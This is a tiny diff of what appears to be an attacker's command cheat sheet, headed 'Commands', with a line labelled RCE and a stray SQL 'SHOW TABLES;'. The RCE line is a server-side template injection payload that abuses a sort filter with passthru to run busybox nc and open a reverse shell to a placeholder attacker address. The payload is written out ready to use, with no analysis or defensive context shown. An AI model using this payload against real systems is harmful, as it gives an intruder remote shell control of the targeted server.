@@ -1,4 +1,5 @@
 **Commands**
+
 **RCE** ```{{['busybox nc [ATTACKER ADDRESS] -e /bin/bash','']|sort('passthru')}}```
  
 SHOW TABLES;
